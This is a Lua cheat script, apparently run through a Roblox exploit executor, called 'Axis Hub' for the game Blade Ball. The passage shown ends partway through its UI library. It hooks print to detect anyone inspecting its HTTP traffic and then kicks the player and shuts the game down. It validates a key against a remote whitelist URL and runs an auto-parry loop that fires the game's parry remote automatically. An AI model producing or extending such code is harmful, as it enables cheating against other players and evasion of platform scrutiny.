local denied_message = "Axis Protector From Http Spy"
local AxisCheck

AxisCheck = hookfunction(print, function(urprint, ...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
        urprint = denied_message
    
            game.Players.LocalPlayer:Kick("Axis Protector Http From Spy game will shutdown in 4 sec")
            wait(4)
            game:Shutdown()
        end
    
    return AxisCheck(urprint, ...)
end)


_G.Key = "Axis"

local key = _G.Key
local check = "https://axishub.000webhostapp.com/check.php?key=" .. key
if game:HttpGet(check) == "Whitelisted" then


    if not isfolder("Axis Hub") then
        makefolder("Axis Hub")
    end
    
    local function saveSetting()
        local data = {
            Distance = getgenv().Dis,
            Enable = _G.hehe,
            parry = getgenv().auto
           
        }
        local encodedData = game:GetService('HttpService'):JSONEncode(data)
    local fn = "Axis Hub/Blade Ball.json"
        writefile(fn, encodedData)
    end
    
    
    local function loadSetting()
        local success, errorMessage = pcall(function()
    local fn = "Axis Hub/Blade Ball.json"
            local fileData = readfile(fn)
            if fileData then
                local decodedData = game:GetService('HttpService'):JSONDecode(fileData)
                if decodedData then
                    getgenv().Dis = decodedData.Distance
                    _G.hehe = decodedData.Enable
                    getgenv().auto = decodedData.parry
                 
                   
                end
            end
        end)
    
        if not success then
            warn("Failed to load setting: " .. errorMessage)
        end
    end
    
    
    loadSetting()
    
    
    
    spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().auto then
                        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local replicatedStorage = game:GetService("ReplicatedStorage")
        local runService = game:GetService("RunService")
        local parryButtonPress = replicatedStorage.Remotes.ParryButtonPress
        local ballsFolder = workspace:WaitForChild("Balls")
        
        
        
        local function onCharacterAdded(newCharacter)
            character = newCharacter
        end
        
        player.CharacterAdded:Connect(onCharacterAdded)
        
        local focusedBall = nil  
        
        local function chooseNewFocusedBall()
            local balls = ballsFolder:GetChildren()
            focusedBall = nil
            for _, ball in ipairs(balls) do
                if ball:GetAttribute("realBall") == true then
                    focusedBall = ball
                    break
                end
            end
        end
        
        chooseNewFocusedBall()
        
        local function timeUntilImpact(ballVelocity, distanceToPlayer, playerVelocity)
            local directionToPlayer = (character.HumanoidRootPart.Position - focusedBall.Position).Unit
            local velocityTowardsPlayer = ballVelocity:Dot(directionToPlayer) - playerVelocity:Dot(directionToPlayer)
        
            if velocityTowardsPlayer <= 0 then
                return math.huge
            end
        
            local distanceToBeCovered = distanceToPlayer - 30
            return distanceToBeCovered / velocityTowardsPlayer
        end
        
        local BASE_THRESHOLD = 0.18
        local VELOCITY_SCALING_FACTOR_FAST = 0.00000000000000000002
        local VELOCITY_SCALING_FACTOR_Middle = 0.017
        local VELOCITY_SCALING_FACTOR_SLOW = 0.01

        local function getDynamicThreshold(ballVelocityMagnitude)
        if ballVelocityMagnitude > 40 then
            return math.max(0.27, BASE_THRESHOLD - (ballVelocityMagnitude * VELOCITY_SCALING_FACTOR_FAST))
        elseif ballVelocityMagnitude < 25 then
            return math.min(0.1, BASE_THRESHOLD + (ballVelocityMagnitude * VELOCITY_SCALING_FACTOR_SLOW))
    elseif ballVelocityMagnitude > 25 or ballVelocityMagnitude < 40 then
            return math.min(0.09, BASE_THRESHOLD + (ballVelocityMagnitude * VELOCITY_SCALING_FACTOR_Middle))
        end
    end

                        local function checkBallDistance()
                            if not character or not character:FindFirstChild("Highlight") then return end
                            local charPos = character.PrimaryPart.Position
                            local charVel = character.PrimaryPart.Velocity
                        
                            if focusedBall and not focusedBall.Parent then
                                chooseNewFocusedBall()
                            end
                          
                        
                            if not focusedBall then return end
                        
                            local ball = focusedBall
                            local distanceToPlayer = (ball.Position - charPos).Magnitude
                        
                            if distanceToPlayer < 10 then
                                parryButtonPress:Fire()
                                return
                            end
                        
                            local timeToImpact = timeUntilImpact(ball.Velocity, distanceToPlayer, charVel)
                            local dynamicThreshold = getDynamicThreshold(ball.Velocity.Magnitude)
                        
                            if timeToImpact < dynamicThreshold then
                                parryButtonPress:Fire()
                            end
                        end
            checkBallDistance() 
         
        end
        end)
        end
        end)
        




if game.CoreGui:FindFirstChild("PlayerGui") then
    game.CoreGui:FindFirstChild("PlayerGui"):Destroy()
end
local Flux = {RainbowColorValue = 0, HueSelectionPosition = 0}
local PresetColor = Color3.fromRGB(66, 134, 255)
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local LocalPlayer = game:GetService("Players").LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local CloseBind = Enum.KeyCode.RightControl

local Lago = Instance.new("ScreenGui")
Lago.Name = "PlayerGui"
Lago.Parent = game.CoreGui
Lago.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

coroutine.wrap(
    function()
        while wait() do
            Flux.RainbowColorValue = Flux.RainbowColorValue + 1 / 255
            Flux.HueSelectionPosition = Flux.HueSelectionPosition + 1

            if Flux.RainbowColorValue >= 1 then
                Flux.RainbowColorValue = 0
            end

            if Flux.HueSelectionPosition == 80 then
                Flux.HueSelectionPosition = 0
            end
        end
    end
)()

local function MakeDraggable(topbarobject, object)
    local Dragging = nil
    local DragInput = nil
    local DragStart = nil
    local StartPosition = nil

    local function Update(input)
        local Delta = input.Position - DragStart
        local pos =
            UDim2.new(
                StartPosition.X.Scale,
                StartPosition.X.Offset + Delta.X,
                StartPosition.Y.Scale,
                StartPosition.Y.Offset + Delta.Y
            )
        local Tween = TweenService:Create(object, TweenInfo.new(0.2), {Position = pos})
        Tween:Play()
    end

    topbarobject.InputBegan:Connect(
        function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                Dragging = true
                DragStart = input.Position
                StartPosition = object.Position

                input.Changed:Connect(
                    function()
                        if input.UserInputState == Enum.UserInputState.End then
                            Dragging = false
                        end
                    end
                )
            end
        end
    )

    topbarobject.InputChanged:Connect(
        function(input)
            if
                input.UserInputType == Enum.UserInputType.MouseMovement or
                input.UserInputType == Enum.UserInputType.Touch
            then
                DragInput = input
            end
        end
    )

    UserInputService.InputChanged:Connect(
        function(input)
            if input == DragInput and Dragging then
                Update(input)
            end
        end
    )
end



function Flux:Window(text, bottom,mainclr,toclose)
    CloseBind = toclose or Enum.KeyCode.RightControl
    PresetColor = mainclr or Color3.fromRGB(0, 254, 252)
    local fs = false
    local MainFrame = Instance.new("Frame")
    local MainCorner = Instance.new("UICorner")
    local LeftFrame = Instance.new("Frame")
    local LeftCorner = Instance.new("UICorner")
    local GlowTabHolder = Instance.new("ImageLabel")
    local Title = Instance.new("TextLabel")
    local BottomText = Instance.new("TextLabel")
    local TabHold = Instance.new("Frame")
    local TabLayout = Instance.new("UIListLayout")
    local Drag = Instance.new("Frame")
    local ContainerFolder = Instance.new("Folder")

    MainFrame.Name = "MainFrame"
    MainFrame.Parent = Lago
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    MainFrame.ClipsDescendants = true
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    MainFrame.Size = UDim2.new(0, 0, 0, 0)

    MainCorner.CornerRadius = UDim.new(0, 5)
    MainCorner.Name = "MainCorner"
    MainCorner.Parent = MainFrame

    LeftFrame.Name = "LeftFrame"
    LeftFrame.Parent = MainFrame
    LeftFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    LeftFrame.Size = UDim2.new(0, 190, 0, 484)

    LeftCorner.CornerRadius = UDim.new(0, 5)
    LeftCorner.Name = "LeftCorner"
    LeftCorner.Parent = LeftFrame

    GlowTabHolder.Name = "GlowTabHolder"
    GlowTabHolder.Parent = LeftFrame
    GlowTabHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    GlowTabHolder.BackgroundTransparency = 1.000
    GlowTabHolder.BorderSizePixel = 0
    GlowTabHolder.Position = UDim2.new(0, -15, 0, -15)
    GlowTabHolder.Size = UDim2.new(1, 30, 1, 30)
    GlowTabHolder.ZIndex = 0
    GlowTabHolder.Image = "rbxassetid://4996891970"
    GlowTabHolder.ImageColor3 = Color3.fromRGB(15, 15, 15)
    GlowTabHolder.ScaleType = Enum.ScaleType.Slice
    GlowTabHolder.SliceCenter = Rect.new(20, 20, 280, 280)
    
    
    Title.Name = "Title"
    Title.Parent = LeftFrame
    Title.BackgroundColor3 = Color3.fromRGB(255, 0, 11)
    Title.BackgroundTransparency = 1.000
    Title.Position = UDim2.new(0.097560972, 0, 0.0475206636, 0)
    Title.Size = UDim2.new(0, 111, 0, 34)
    Title.Font = Enum.Font.GothamBold
    Title.Text = text
    Title.TextColor3 = Color3.fromRGB(0, 254, 252)
    Title.TextSize = 25.000
    Title.TextXAlignment = Enum.TextXAlignment.Left

    BottomText.Name = "BottomText"
    BottomText.Parent = LeftFrame
    BottomText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    BottomText.BackgroundTransparency = 1.000
    BottomText.Position = UDim2.new(0.097560972, 0, 0.0889999792, 0)
    BottomText.Size = UDim2.new(0, 113, 0, 28)
    BottomText.Font = Enum.Font.Gotham
    BottomText.Text = bottom
    BottomText.TextColor3 = Color3.fromRGB(255, 255, 255)
    BottomText.TextSize = 14.000
    BottomText.TextTransparency = 0.300
    BottomText.TextXAlignment = Enum.TextXAlignment.Left

    TabHold.Name = "TabHold"
    TabHold.Parent = LeftFrame
    TabHold.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TabHold.BackgroundTransparency = 1.000
    TabHold.Position = UDim2.new(0, 0, 0.167355374, 0)
    TabHold.Size = UDim2.new(0, 190, 0, 403)

    TabLayout.Name = "TabLayout"
    TabLayout.Parent = TabHold
    TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
    TabLayout.Padding = UDim.new(0, 3)

    Drag.Name = "Drag"
    Drag.Parent = MainFrame
    Drag.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Drag.BackgroundTransparency = 1.000
    Drag.Position = UDim2.new(0.290368259, 0, 0, 0)
    Drag.Size = UDim2.new(0, 501, 0, 23)

    ContainerFolder.Name = "ContainerFolder"
    ContainerFolder.Parent = MainFrame

    MakeDraggable(Drag,MainFrame)
    MakeDraggable(LeftFrame,MainFrame)
    MainFrame:TweenSize(UDim2.new(0, 706, 0, 484), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)

    local uitoggled = false
    UserInputService.InputBegan:Connect(
        function(io, p)
            if io.KeyCode == CloseBind then
                if uitoggled == false then
                    MainFrame:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    uitoggled = true
                    wait(.5)
                    Lago.Enabled = false
                else
                    MainFrame:TweenSize(UDim2.new(0, 706, 0, 484), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    Lago.Enabled = true
                    uitoggled = false
                end
            end
        end
    )

    function Flux:Notification(desc,buttontitle)
        for i, v in next, MainFrame:GetChildren() do
            if v.Name == "NotificationBase" then
                v:Destroy()
            end
        end
        local NotificationBase = Instance.new("TextButton")
        local NotificationBaseCorner = Instance.new("UICorner")
        local NotificationFrame = Instance.new("Frame")
        local NotificationFrameCorner = Instance.new("UICorner")
        local NotificationFrameGlow = Instance.new("ImageLabel")
        local NotificationTitle = Instance.new("TextLabel")
        local CloseBtn = Instance.new("TextButton")
        local CloseBtnCorner = Instance.new("UICorner")
        local NotificationDesc = Instance.new("TextLabel")

        NotificationBase.Name = "NotificationBase"
        NotificationBase.Parent = MainFrame
        NotificationBase.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        NotificationBase.BackgroundTransparency = 1
        NotificationBase.Size = UDim2.new(0, 706, 0, 484)
        NotificationBase.AutoButtonColor = false
        NotificationBase.Font = Enum.Font.SourceSans
        NotificationBase.Text = ""
        NotificationBase.TextColor3 = Color3.fromRGB(0, 0, 0)
        NotificationBase.TextSize = 14.000
        NotificationBase.Visible = true

        NotificationBaseCorner.CornerRadius = UDim.new(0, 5)
        NotificationBaseCorner.Name = "NotificationBaseCorner"
        NotificationBaseCorner.Parent = NotificationBase

        NotificationFrame.Name = "NotificationFrame"
        NotificationFrame.Parent = NotificationBase
        NotificationFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        NotificationFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        NotificationFrame.ClipsDescendants = true
        NotificationFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        NotificationFrame.Size = UDim2.new(0, 0, 0, 0)

        NotificationFrameCorner.CornerRadius = UDim.new(0, 5)
        NotificationFrameCorner.Name = "NotificationFrameCorner"
        NotificationFrameCorner.Parent = NotificationFrame

        NotificationFrameGlow.Name = "NotificationFrameGlow"
        NotificationFrameGlow.Parent = NotificationFrame
        NotificationFrameGlow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        NotificationFrameGlow.BackgroundTransparency = 1.000
        NotificationFrameGlow.BorderSizePixel = 0
        NotificationFrameGlow.Position = UDim2.new(0, -15, 0, -15)
        NotificationFrameGlow.Size = UDim2.new(1, 30, 1, 30)
        NotificationFrameGlow.ZIndex = 0
        NotificationFrameGlow.Image = "rbxassetid://4996891970"
        NotificationFrameGlow.ImageColor3 = Color3.fromRGB(15, 15, 15)
        NotificationFrameGlow.ScaleType = Enum.ScaleType.Slice
        NotificationFrameGlow.SliceCenter = Rect.new(20, 20, 280, 280)

        NotificationTitle.Name = "NotificationTitle"
        NotificationTitle.Parent = NotificationFrame
        NotificationTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        NotificationTitle.BackgroundTransparency = 1.000
        NotificationTitle.Position = UDim2.new(0.0400609747, 0, 0.0761325806, 0)
        NotificationTitle.Size = UDim2.new(0, 111, 0, 34)
        NotificationTitle.Font = Enum.Font.GothamBold
        NotificationTitle.Text = Title.Text .. " | NOTIFICATION"
        NotificationTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        NotificationTitle.TextSize = 24.000
        NotificationTitle.TextXAlignment = Enum.TextXAlignment.Left
        NotificationTitle.TextTransparency = 1

        CloseBtn.Name = "CloseBtn"
        CloseBtn.Parent = NotificationFrame
        CloseBtn.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
        CloseBtn.ClipsDescendants = true
        CloseBtn.Position = UDim2.new(0.0403124988, 0, 0.720855951, 0)
        CloseBtn.Size = UDim2.new(0, 366, 0, 43)
        CloseBtn.AutoButtonColor = false
        CloseBtn.Font = Enum.Font.Gotham
        CloseBtn.Text = buttontitle
        CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        CloseBtn.TextSize = 15.000
        CloseBtn.TextTransparency = 1
        CloseBtn.BackgroundTransparency = 1

        CloseBtnCorner.CornerRadius = UDim.new(0, 4)
        CloseBtnCorner.Name = "CloseBtnCorner"
        CloseBtnCorner.Parent = CloseBtn

        NotificationDesc.Name = "NotificationDesc"
        NotificationDesc.Parent = NotificationFrame
        NotificationDesc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        NotificationDesc.BackgroundTransparency = 1.000
        NotificationDesc.Position = UDim2.new(0.112499997, 0, 0.266355127, 0)
        NotificationDesc.Size = UDim2.new(0, 309, 0, 82)
        NotificationDesc.Font = Enum.Font.Gotham
        NotificationDesc.Text = desc
        NotificationDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
        NotificationDesc.TextSize = 15.000
        NotificationDesc.TextWrapped = true
        NotificationDesc.TextTransparency = 1

        CloseBtn.MouseEnter:Connect(function()
            TweenService:Create(
                CloseBtn,
                TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {TextTransparency = 0}
            ):Play()
        end)

        CloseBtn.MouseLeave:Connect(function()
            TweenService:Create(
                CloseBtn,
                TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {TextTransparency = 0.3}
            ):Play()
        end)

        CloseBtn.MouseButton1Click:Connect(function()

            TweenService:Create(
                NotificationDesc,
                TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {TextTransparency = 1}
            ):Play()
            TweenService:Create(
                CloseBtn,
                TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {TextTransparency = 1}
            ):Play()
            TweenService:Create(
                NotificationTitle,
                TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {TextTransparency = 1}
            ):Play()
            TweenService:Create(
                CloseBtn,
                TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {BackgroundTransparency = 1}
            ):Play()

            wait(.4)
            CloseBtn.Visible = false
            NotificationFrame:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)

            wait(.2)

            TweenService:Create(
                NotificationBase,
                TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {BackgroundTransparency = 1}
            ):Play()

            wait(.2)

            NotificationBase.Visible = false
        end)


        TweenService:Create(
            NotificationBase,
            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = 0.550}
        ):Play()

        wait(.1)

        NotificationFrame:TweenSize(UDim2.new(0, 400, 0, 214), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)

        wait(.4)
        TweenService:Create(
            NotificationDesc,
            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {TextTransparency = .3}
        ):Play()
        TweenService:Create(
            CloseBtn,
            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {TextTransparency = .3}
        ):Play()
        TweenService:Create(
            NotificationTitle,
            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {TextTransparency = 0}
        ):Play()
        TweenService:Create(
            CloseBtn,
            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = 0}
        ):Play()
    end
    local Tabs = {}
    function Tabs:Tab(text,ico)
        local Tab = Instance.new("TextButton")
        local TabIcon = Instance.new("ImageLabel")
        local TabTitle = Instance.new("TextLabel")


        Tab.Name = "Tab"
        Tab.Parent = TabHold
        Tab.BackgroundColor3 = PresetColor
        Tab.BorderSizePixel = 0
        Tab.Size = UDim2.new(0, 190, 0, 40)
        Tab.AutoButtonColor = false
        Tab.Font = Enum.Font.SourceSans
        Tab.Text = ""
        Tab.TextColor3 = Color3.fromRGB(0, 0, 0)
        Tab.TextSize = 14.000
        Tab.BackgroundTransparency = 1

        TabIcon.Name = "TabIcon"
        TabIcon.Parent = Tab
        TabIcon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TabIcon.BackgroundTransparency = 1.000
        TabIcon.Position = UDim2.new(0.0634146333, 0, 0.25, 0)
        TabIcon.Size = UDim2.new(0, 20, 0, 20)
        TabIcon.Image = ico
        TabIcon.ImageTransparency = .3

        TabTitle.Name = "TabTitle"
        TabTitle.Parent = Tab
        TabTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TabTitle.BackgroundTransparency = 1.000
        TabTitle.Position = UDim2.new(0.1902439, 0, 0.25, 0)
        TabTitle.Size = UDim2.new(0, 113, 0, 19)
        TabTitle.Font = Enum.Font.Gotham
        TabTitle.Text = text
        TabTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        TabTitle.TextSize = 15.000
        TabTitle.TextXAlignment = Enum.TextXAlignment.Left
        TabTitle.TextTransparency = .3

        local Container = Instance.new("ScrollingFrame")
        local ContainerLayout = Instance.new("UIListLayout")


        Container.Name = "Container"
        Container.Parent = ContainerFolder
        Container.Active = true
        Container.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Container.BackgroundTransparency = 1.000
        Container.BorderSizePixel = 0
        Container.Position = UDim2.new(0.321529746, 0, 0.0475206599, 0)
        Container.Size = UDim2.new(0, 470, 0, 438)
        Container.CanvasSize = UDim2.new(0, 0, 0, 0)
        Container.ScrollBarThickness = 5
        Container.Visible = false
        Container.ScrollBarImageColor3 = Color3.fromRGB(71, 76, 84)

        ContainerLayout.Name = "ContainerLayout"
        ContainerLayout.Parent = Container
        ContainerLayout.SortOrder = Enum.SortOrder.LayoutOrder
        ContainerLayout.Padding = UDim.new(0, 15)
        if fs == false then
            fs = true
            TabTitle.TextTransparency = 0
            TabIcon.ImageTransparency = 0
            Tab.BackgroundTransparency = 0
            Container.Visible = true
        end

        Tab.MouseButton1Click:Connect(function()
            for i, v in next, ContainerFolder:GetChildren() do
                if v.Name == "Container" then
                    v.Visible = false
                end
                Container.Visible = true
            end
            for i, v in next, TabHold:GetChildren() do
                if v.Name == "Tab" then
                    TweenService:Create(
                        v,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 1}
                    ):Play()
                    TweenService:Create(
                        v.TabIcon,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageTransparency = .3}
                    ):Play()
                    TweenService:Create(
                        v.TabTitle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = .3}
                    ):Play()
                    TweenService:Create(
                        Tab,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 0}
                    ):Play()
                    TweenService:Create(
                        TabIcon,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageTransparency = 0}
                    ):Play()
                    TweenService:Create(
                        TabTitle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0}
                    ):Play()
                end
            end
        end)
        local ContainerContent = {}
        function ContainerContent:Button(text,callback)
            local BtnDescToggled = false
            local Button = Instance.new("TextButton")
            local ButtonCorner = Instance.new("UICorner")
            local Title = Instance.new("TextLabel")
            local Circle = Instance.new("Frame")
            local CircleCorner = Instance.new("UICorner")
            local CircleSmall = Instance.new("Frame")
            local CircleSmallCorner = Instance.new("UICorner")

            Button.Name = "Button"
            Button.Parent = Container
            Button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            Button.ClipsDescendants = true
            Button.Position = UDim2.new(0.370312512, 0, 0.552631557, 0)
            Button.Size = UDim2.new(0, 457, 0, 43)
            Button.AutoButtonColor = false
            Button.Font = Enum.Font.SourceSans
            Button.Text = ""
            Button.TextColor3 = Color3.fromRGB(0, 0, 0)
            Button.TextSize = 14.000

            ButtonCorner.CornerRadius = UDim.new(0, 4)
            ButtonCorner.Name = "ButtonCorner"
            ButtonCorner.Parent = Button

            Title.Name = "Title"
            Title.Parent = Button
            Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Title.BackgroundTransparency = 1.000
            Title.Position = UDim2.new(0.0822437406, 0, 0, 0)
            Title.Size = UDim2.new(0, 113, 0, 42)
            Title.Font = Enum.Font.Gotham
            Title.Text = text
            Title.TextColor3 = Color3.fromRGB(255, 255, 255)
            Title.TextSize = 15.000
            Title.TextTransparency = 0.300
            Title.TextXAlignment = Enum.TextXAlignment.Left

            Circle.Name = "Circle"
            Circle.Parent = Title
            Circle.Active = true
            Circle.AnchorPoint = Vector2.new(0.5, 0.5)
            Circle.BackgroundColor3 = Color3.fromRGB(255,255,255)
            Circle.Position = UDim2.new(-0.150690272, 0, 0.503000021, 0)
            Circle.Size = UDim2.new(0, 11, 0, 11)

            CircleCorner.CornerRadius = UDim.new(2, 6)
            CircleCorner.Name = "CircleCorner"
            CircleCorner.Parent = Circle

            CircleSmall.Name = "CircleSmall"
            CircleSmall.Parent = Circle
            CircleSmall.Active = true
            CircleSmall.AnchorPoint = Vector2.new(0.5, 0.5)
            CircleSmall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            CircleSmall.BackgroundTransparency = 1.000
            CircleSmall.Position = UDim2.new(0.485673368, 0, 0.503000021, 0)
            CircleSmall.Size = UDim2.new(0, 9, 0, 9)

            CircleSmallCorner.CornerRadius = UDim.new(2, 6)
            CircleSmallCorner.Name = "CircleSmallCorner"
            CircleSmallCorner.Parent = CircleSmall


            Button.MouseEnter:Connect(function()
                TweenService:Create(
                    Title,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {TextTransparency = 0}
                ):Play()
            end)

            Button.MouseLeave:Connect(function()
                TweenService:Create(
                    Title,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {TextTransparency = 0.3}
                ):Play()
            end)

            Button.MouseButton1Click:Connect(function()
                pcall(callback)
            end)

            Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
        end
        function ContainerContent:Toggle(text, default, callback)
            local ToggleDescToggled = false
            local Toggled = false
            local Toggle = Instance.new("TextButton")
            local ToggleCorner = Instance.new("UICorner")
            local Title = Instance.new("TextLabel")
            local Circle = Instance.new("Frame")
            local CircleCorner = Instance.new("UICorner")
            local CircleSmall = Instance.new("Frame")
            local CircleSmallCorner = Instance.new("UICorner")
            local ToggleFrame = Instance.new("Frame")
            local ToggleFrameCorner = Instance.new("UICorner")
            local ToggleCircle = Instance.new("Frame")
            local ToggleCircleCorner = Instance.new("UICorner")

            Toggle.Name = "Toggle"
            Toggle.Parent = Container
            Toggle.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            Toggle.ClipsDescendants = true
            Toggle.Position = UDim2.new(0.110937506, 0, 0.67653507, 0)
            Toggle.Size = UDim2.new(0, 457, 0, 43)
            Toggle.AutoButtonColor = false
            Toggle.Font = Enum.Font.SourceSans
            Toggle.Text = ""
            Toggle.TextColor3 = Color3.fromRGB(0, 0, 0)
            Toggle.TextSize = 14.000

            ToggleCorner.CornerRadius = UDim.new(0, 4)
            ToggleCorner.Name = "ToggleCorner"
            ToggleCorner.Parent = Toggle

            Title.Name = "Title"
            Title.Parent = Toggle
            Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Title.BackgroundTransparency = 1.000
            Title.Position = UDim2.new(0.0822437406, 0, 0, 0)
            Title.Size = UDim2.new(0, 113, 0, 42)
            Title.Font = Enum.Font.Gotham
            Title.Text = text
            Title.TextColor3 = Color3.fromRGB(255, 255, 255)
            Title.TextSize = 15.000
            Title.TextTransparency = 0.300
            Title.TextXAlignment = Enum.TextXAlignment.Left

            Circle.Name = "Circle"
            Circle.Parent = Title
            Circle.Active = true
            Circle.AnchorPoint = Vector2.new(0.5, 0.5)
            Circle.BackgroundColor3 = Color3.fromRGB(211, 211, 211)
            Circle.Position = UDim2.new(-0.150690272, 0, 0.503000021, 0)
            Circle.Size = UDim2.new(0, 11, 0, 11)

            CircleCorner.CornerRadius = UDim.new(2, 6)
            CircleCorner.Name = "CircleCorner"
            CircleCorner.Parent = Circle

            CircleSmall.Name = "CircleSmall"
            CircleSmall.Parent = Circle
            CircleSmall.Active = true
            CircleSmall.AnchorPoint = Vector2.new(0.5, 0.5)
            CircleSmall.BackgroundColor3 = Color3.fromRGB(64, 68, 75)
            CircleSmall.BackgroundTransparency = 1.000
            CircleSmall.Position = UDim2.new(0.485673368, 0, 0.503000021, 0)
            CircleSmall.Size = UDim2.new(0, 9, 0, 9)

            CircleSmallCorner.CornerRadius = UDim.new(2, 6)
            CircleSmallCorner.Name = "CircleSmallCorner"
            CircleSmallCorner.Parent = CircleSmall

            ToggleFrame.Name = "ToggleFrame"
            ToggleFrame.Parent = Circle
            ToggleFrame.BackgroundColor3 = Color3.fromRGB(226, 227, 227)
            ToggleFrame.Position = UDim2.new(33.0856934, 0, 0, 0)
            ToggleFrame.Size = UDim2.new(0, 27, 0, 11)

            ToggleFrameCorner.Name = "ToggleFrameCorner"
            ToggleFrameCorner.Parent = ToggleFrame

            ToggleCircle.Name = "ToggleCircle"
            ToggleCircle.Parent = ToggleFrame
            ToggleCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ToggleCircle.Position = UDim2.new(0, 0, -0.272727281, 0)
            ToggleCircle.Selectable = true
            ToggleCircle.Size = UDim2.new(0, 17, 0, 17)

            ToggleCircleCorner.CornerRadius = UDim.new(2, 8)
            ToggleCircleCorner.Name = "ToggleCircleCorner"
            ToggleCircleCorner.Parent = ToggleCircle


            Toggle.MouseEnter:Connect(function()
                TweenService:Create(
                    Title,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {TextTransparency = 0}
                ):Play()
            end)

            Toggle.MouseLeave:Connect(function()
                TweenService:Create(
                    Title,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {TextTransparency = 0.3}
                ):Play()
            end)

            Toggle.MouseButton1Click:Connect(function()
                if Toggled == false then
                    ToggleCircle:TweenPosition(UDim2.new(0.37, 0,-0.273, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .3, true)
                    TweenService:Create(
                        ToggleCircle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 =PresetColor}
                    ):Play()
                else
                    ToggleCircle:TweenPosition(UDim2.new(0, 0,-0.273, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .3, true)
                    TweenService:Create(
                        ToggleCircle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                end
                Toggled = not Toggled
                pcall(callback, Toggled)
            end)
